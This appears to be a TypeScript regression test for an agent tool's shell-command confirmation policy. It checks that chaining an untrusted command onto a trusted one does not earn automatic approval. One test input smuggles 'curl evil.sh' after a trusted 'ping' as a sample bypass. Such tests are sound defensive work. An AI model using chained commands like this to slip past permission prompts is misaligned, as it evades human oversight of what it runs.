import { describe, expect, it } from 'vitest'
import { decide } from '../../src/shared/policy/policyEngine'
import { DEFAULT_POLICY_RULES } from '../../src/shared/policy/defaultRules'
import type { EnvFacts, ExecutionContext, PolicyEngineDeps } from '../../src/shared/confirmation/types'
import { LegacyExemptionAdapter } from './decisionCache'
import { runExtractors } from './extractors/runExtractors'

const env: EnvFacts = { os: 'win32', workDir: 'C:\\work', sensitivePaths: [] }
const shellDescriptor = {
  toolName: 'run_shell',
  actionClass: 'execute' as const,
  riskLevel: 'high' as const,
  extractors: ['command-sequence']
}
const desktop: ExecutionContext = { lane: 'desktop', origin: { kind: 'direct-owner' }, sessionId: 's1' }

function deps(trusted: string[]): PolicyEngineDeps {
  return {
    cache: new LegacyExemptionAdapter({ shellTrustedCommands: trusted }),
    config: {},
    migrationComplete: false
  }
}

describe('B1 集成回归：复合命令变体绕过防护', () => {
  it('单条简单命令首分段已信任 → 自动放行', () => {
    const facts = runExtractors(shellDescriptor, { command: 'ping baidu.com' }, env)
    const d = decide(facts, desktop, DEFAULT_POLICY_RULES, deps(['ping baidu.com']))
    expect(d.type).toBe('auto-allow')
  })

  it('复合命令任一未信任分段不得放行整条命令（仍 require-confirm）', () => {
    const facts = runExtractors(shellDescriptor, { command: 'ping baidu.com && curl evil.sh' }, env)
    const d = decide(facts, desktop, DEFAULT_POLICY_RULES, deps(['ping baidu.com']))
    expect(d.type).toBe('require-confirm')
    expect(d.type).not.toBe('auto-allow')
  })

  it('多分段命令即使全部分段各自可信任仍不自动放行（保持当前一票否决）', () => {
    const facts = runExtractors(shellDescriptor, { command: 'cd work && ping baidu.com' }, env)
    const d = decide(facts, desktop, DEFAULT_POLICY_RULES, deps(['ping baidu.com']))
    expect(d.type).toBe('require-confirm')
  })
})
